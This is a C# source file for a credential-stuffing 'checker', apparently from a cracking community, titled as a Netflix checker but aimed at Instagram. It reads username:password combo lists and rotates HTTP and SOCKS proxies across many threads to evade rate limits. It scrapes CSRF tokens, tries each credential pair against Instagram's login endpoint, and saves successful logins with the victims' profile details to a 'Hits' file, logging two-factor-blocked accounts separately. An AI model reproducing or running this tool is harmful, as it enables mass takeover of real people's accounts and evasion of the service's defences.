using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Text;
using System.Drawing;
using Leaf.xNet;

namespace crackturkey
{
    internal class Checker_Main
    {
        static Color _color = Color.FromArgb(0, 247, 255);
        private static readonly ConcurrentDictionary<long, long> Cps = new ConcurrentDictionary<long, long>();
        private static readonly object WriteLock = new object();
        private Random rnd = new Random();
        private ConcurrentQueue<string> coqueue = new ConcurrentQueue<string>();
        private List<string> proqueue = new List<string>();
        private string currentdirectory = Directory.GetCurrentDirectory();
        private int hits;
        private int free;
        private int invalids;
        private int retries;
        private int length;
        private int checkd;
        private string protocol;
        private string folder;


        /// Tarama ekranındaki tanıtım kısımı.
        static string myTitle = "Netflix Checker [->] 🔥 ! Muhammed 🔥";

        public Checker_Main(ConcurrentQueue<string> combos, List<string> proxies, string prot)
        {
            this.coqueue = combos;
            this.proqueue = proxies;
            this.length = this.coqueue.Count;
            this.protocol = prot;
            this.currentdirectory = Directory.GetCurrentDirectory();
            this.folder = this.currentdirectory + "\\Hits\\" + DateTime.Now.ToString("dd-MM-yyyy H.mm");
        }


        public void Create()
        {
            bool flag = !Directory.Exists("Hits");
            if (flag)
            {
                Directory.CreateDirectory("Hits");
            }
            bool flag2 = !Directory.Exists(this.folder);
            if (flag2)
            {
                Directory.CreateDirectory(this.folder);
            }
        }

        private void Login()
        {
            bool flag = this.protocol == "HTTP" || this.protocol == "SOCKS4" || this.protocol == "SOCKS5" || this.protocol == "NO";
            if (flag)
            {
                HttpRequest httpRequest = new HttpRequest
                {
                    UserAgent = "User-Agent: Argo/12.7.0 (iPhone; iOS 14.2; Scale/2.00)",
                    KeepAliveTimeout = 5000,
                    ConnectTimeout = 5000,
                    ReadWriteTimeout = 5000,
                    IgnoreProtocolErrors = true,
                    AllowAutoRedirect = true,
                    Proxy = null,
                    UseCookies = true
                };

                while (coqueue.Count > 0)
                {
                    string text;
                    coqueue.TryDequeue(out text);
                    string[] array = text.Split(new char[]
                    {
                        ':'
                    });
                    string acc = array[0] + ":" + array[1];
                    bool flag2 = httpRequest.Proxy == null;
                    if (flag2)
                    {
                        bool flag11 = this.protocol == "NO";
                        if (flag11)
                        {
                            httpRequest.Proxy = null;
                        }

                        bool flag3 = this.protocol == "HTTP";
                        if (flag3)
                        {
                            httpRequest.Proxy = HttpProxyClient.Parse(this.proqueue[this.rnd.Next(this.proqueue.Count)]);
                            httpRequest.Proxy.ConnectTimeout = 5000;
                        }
                        bool flag4 = this.protocol == "SOCKS4";
                        if (flag4)
                        {
                            httpRequest.Proxy = Socks4ProxyClient.Parse(this.proqueue[this.rnd.Next(this.proqueue.Count)]);
                            httpRequest.Proxy.ConnectTimeout = 5000;
                        }
                        bool flag5 = this.protocol == "SOCKS5";
                        if (flag5)
                        {
                            httpRequest.Proxy = Socks5ProxyClient.Parse(this.proqueue[this.rnd.Next(this.proqueue.Count)]);
                            httpRequest.Proxy.ConnectTimeout = 5000;
                        }

                    }

                    try
                    {

                        //Get Request Örneği
                        //string response1 = httpRequest.Get("https://secure.javhd.com/login/?back=javhd.com&path=L2VuLw&lang=en&nats=MC4wLjIuMi4wLjAuMC4wLjA").ToString();

                        //Parse Örneği
                        //string parse1 = Parse(response1, "salt = '", "'");


                        //Post Data array[0]=<USER> , array[1]=<PASS> ,parse1=<parse>
                        //string postdata = "username=" + array[0] + "&password=" + array[1];


                        //string response2 = httpRequest.Post("https://judua3rtinpst0s.xyz/v1/users/tokensn", postdata, "application/x-www-form-urlencoded").ToString();

                        string GUID = Guid.NewGuid().ToString();

                        httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                        httpRequest.AddHeader("Pragma", "no-cache");
                        httpRequest.AddHeader("Accept", "*/*");

                        string tokenurl = httpRequest.Get("https://www.instagram.com/").ToString();

                        string csrftoken = Parse(tokenurl, "csrf_token\":\"", "\"");
                        string fbapp = Parse(tokenurl, "meta property=\"fb:app_id\" content=\"", "\"");

                        httpRequest.AddHeader("accept", "*/*");
                        httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
                        httpRequest.AddHeader("accept-language", "tr-TR,tr;q=0.9");
                        httpRequest.AddHeader("content-type", "application/x-www-form-urlencoded");
                        httpRequest.AddHeader("origin", "https://www.instagram.com");
                        httpRequest.AddHeader("referer", "https://www.instagram.com/");
                        httpRequest.AddHeader("sec-fetch-dest", "empty");
                        httpRequest.AddHeader("sec-fetch-mode", "cors");
                        httpRequest.AddHeader("sec-fetch-site", "same-origin");
                        httpRequest.AddHeader("sec-gpc", "1");
                        httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36");
                        httpRequest.AddHeader("x-asbd-id", "198387");
                        httpRequest.AddHeader("x-csrftoken", csrftoken);
                        httpRequest.AddHeader("x-ig-app-id", fbapp);
                        httpRequest.AddHeader("x-ig-www-claim", "hmac.AR2hQusMHhQJzlVDbCVuO1uduYGKOJUBA_5iQAoKsu_GCGW_");
                        httpRequest.AddHeader("x-instagram-ajax", "f0d8536f1a1f");
                        httpRequest.AddHeader("x-requested-with", "XMLHttpRequest");

                        string postdata = "enc_password=%23PWD_BROWSER%3a0%3a1628896342%3a" + array[1] + "&username=" + array[0] + "&queryParams=%7B%22next%22%3A%22%2Flogin%2F%22%2C%22source%22%3A%22desktop_nav%22%7D&optIntoOneTap=false&stopDeletionNonce=&trustedDeviceRecords=%7B%7D";

                        string login = httpRequest.Post("https://www.instagram.com/accounts/login/ajax/", postdata, "application/x-www-form-urlencoded").ToString();


                        //Hits
                        if (login.Contains("authenticated\":true"))
                        {
                            string userid = Parse(login, "userId\":\"", "\"");
                            httpRequest.AddHeader("Accept", "*/*");
                            httpRequest.AddHeader("User-Agent", "Instagram 134.0.0.25.116 (iPhone10,2; iOS 13_3_1; en_US; en-US; scale=2.88; 1080x1920; 204771128) AppleWebKit/420+");
                            httpRequest.AddHeader("Accept-Language", "en-US;q=1");
                            httpRequest.AddHeader("X-IG-Capabilities", "36r/Fw==");
                            httpRequest.AddHeader("X-IG-App-ID", "1099655813402622");
                            httpRequest.AddHeader("X-IG-Connection-Type", "WiFi");
                            httpRequest.AddHeader("X-IG-Connection-Speed", "370kbps");
                            httpRequest.AddHeader("Host", "i.instagram.com");
                            httpRequest.AddHeader("X-IG-ABR-Connection-Speed-KBPS", "1");
                            httpRequest.AddHeader("Connection", "keep-alive");
                            httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
                            string captureurl = httpRequest.Get("https://i.instagram.com/api/v1/users/" + userid + "/info/?device_id=" + GUID).ToString();
                            string isim = Parse(captureurl, "full_name\":\"", "\"");
                            string nick = Parse(captureurl, "username\":\"", "\"");
                            string gonderisayisi = Parse(captureurl, "media_count\":", ",");
                            string takipcisayisi = Parse(captureurl, "follower_count\":", ",");
                            string takipsayisi = Parse(captureurl, "following_count\":", ",");
                            string bio = Parse(captureurl, "biography\":\"", "\"");
                            Colorful.Console.WriteLine("[HIT] " + acc + " | İsim : " + isim + " | Nick : " + nick + " | Gönderi Sayısı : " + gonderisayisi + " | Takipçi Sayısı : " + takipcisayisi + " | Takip Sayısı : " + takipsayisi + " | Bio : " + bio, Color.Green);
                            string capture = " | İsim : " + isim + " | Nick : " + nick + " | Gönderi Sayısı : " + gonderisayisi + " | Takipçi Sayısı : " + takipcisayisi + " | Takip Sayısı : " + takipsayisi + " | Bio : " + bio + " | Checker By : 🔥 ! Muhammed 🔥";
                            hits++;
                            GlobalData.LastChecks++;
                            PremiumTextSave(acc, capture);
                        }

                        //Free-Custom
                        if (login.Contains("checkpoint_required"))
                        {
                            //Capture alırsan capture=Parse gönder
                            Colorful.Console.WriteLine("[2FACTOR] " + acc, Color.Orange);
                            string capture = " | Checker By : 🔥 ! Muhammed 🔥";
                            free++;
                            GlobalData.LastChecks++;
                            FreeTextSave(acc, capture);
                        }

                        //Retries
                        //if (response2.Contains("{\"code\":\"BadRequest\""))
                        //{
                        //    retries++;
                        //    coqueue.Enqueue(acc);
                        //}

                        //Fail "||" veya(or) anlamında ve(and)  için ise "&&" kullan
                        if (login.Contains("authenticated\":false"))
                        {
                            invalids++;
                            GlobalData.LastChecks++;
                        }

                        //Banned
                        //if (login.Contains("throttling_failurea"))
                        //{
                        //    retries++;
                        //    coqueue.Enqueue(acc);
                        //}




                    }
                    catch
                    {
                        retries++;
                        coqueue.Enqueue(text);
                        httpRequest.Proxy = null;
                    }
                }
                httpRequest.Dispose();
            }
        }

        public void Start()
        {
            Task.Factory.StartNew(delegate ()
            {
                while (GlobalData.Working)
                {
                    Checker_Main.Cps.TryAdd(DateTimeOffset.Now.ToUnixTimeSeconds(), (long)GlobalData.LastChecks);
                    GlobalData.LastChecks = 0;
                    Thread.Sleep(1000);
                }
            });
        }


        public void Threading(int amount)
        {
            ServicePointManager.DefaultConnectionLimit = amount * 2;
            ServicePointManager.Expect100Continue = false;
            List<Thread> list = new List<Thread>();
            list.Add(new Thread(new ThreadStart(this.Info)));
            for (int i = 0; i <= amount; i++)
            {
                Thread item = new Thread(new ThreadStart(this.Login));
                list.Add(item);
            }
            foreach (Thread thread in list)
            {
                thread.Start();
            }
        }

        private void Info()
        {
            for (; ; )
            {
                this.checkd = this.hits + this.free + this.invalids;
                Console.Title = string.Format(myTitle + "         Checked: {0}/{1}         Hits: {2}       2Factor: {6}        Invalids: {3}         Retries: {4}         CPM: {5} ", new object[]
                {
                    this.checkd,
                    this.length,
                    this.hits,
                    this.invalids,
                    this.retries,
                    this.GetCpm(),
                    this.free
                });
                Thread.Sleep(1000);
            }
        }


        private long GetCpm()
        {
            long num = 0L;
            foreach (KeyValuePair<long, long> keyValuePair in Checker_Main.Cps)
            {
                bool flag = keyValuePair.Key >= DateTimeOffset.Now.ToUnixTimeSeconds() - 60L;
                if (flag)
                {
                    num += keyValuePair.Value;
                }
            }
            return num;
        }

        private string Parse(string source, string left, string right)
        {
            return source.Split(new string[]
            {
                left
            }, StringSplitOptions.None)[1].Split(new string[]
            {
                right
            }, StringSplitOptions.None)[0];
        }


        private void PremiumTextSave(string acc, string capture)
        {
            object value = string.Concat(new string[]
            {
                acc,
                "",
                capture
            });
            string path = this.folder + "\\Hits.txt";
            try
            {
                bool flag = !File.Exists(path);
                if (flag)
                {
                    File.Create(path).Close();
                }
            }
            catch (Exception value2)
            {
                Console.WriteLine(value2);
            }
            try
            {
                object writeLock = Checker_Main.WriteLock;
                object obj = writeLock;
                lock (obj)
                {
                    using (FileStream fileStream = File.Open(path, FileMode.Append))
                    {
                        using (StreamWriter streamWriter = new StreamWriter(fileStream))
                        {
                            streamWriter.WriteLine(value);
                        }
                    }
                }
            }
            catch (Exception value3)
            {
                Console.WriteLine(value3);
            }
        }

        private void FreeTextSave(string acc, string capture)
        {
            object value = string.Concat(new string[]
           {
                acc,
                "",
                capture
           });

            string path = this.folder + "\\2Factor.txt";
            try
            {
                bool flag = !File.Exists(path);
                if (flag)
                {
                    File.Create(path).Close();
                }
            }
            catch (Exception value2)
            {
                Console.WriteLine(value2);
            }
            try
            {
                object writeLock = Checker_Main.WriteLock;
                object obj = writeLock;
                lock (obj)
                {
                    using (FileStream fileStream = File.Open(path, FileMode.Append))
                    {
                        using (StreamWriter streamWriter = new StreamWriter(fileStream))
                        {
                            streamWriter.WriteLine(value);
                        }
                    }
                }
            }
            catch (Exception value3)
            {
                Console.WriteLine(value3);
            }
        }

        //Lazım olurse Function
        public static string HmacSHA256(string key, string data)
        {
            string hash;
            ASCIIEncoding encoder = new ASCIIEncoding();
            Byte[] code = encoder.GetBytes(key);
            using (HMACSHA256 hmac = new HMACSHA256(code))
            {
                Byte[] hmBytes = hmac.ComputeHash(encoder.GetBytes(data));
                hash = ToHexString(hmBytes);
            }
            return hash;
        }

        //Lazım olurse Function
        public static string ToHexString(byte[] array)
        {
            StringBuilder hex = new StringBuilder(array.Length * 2);
            foreach (byte b in array)
            {
                hex.AppendFormat("{0:x2}", b);
            }
            return hex.ToString();
        }


    }
}
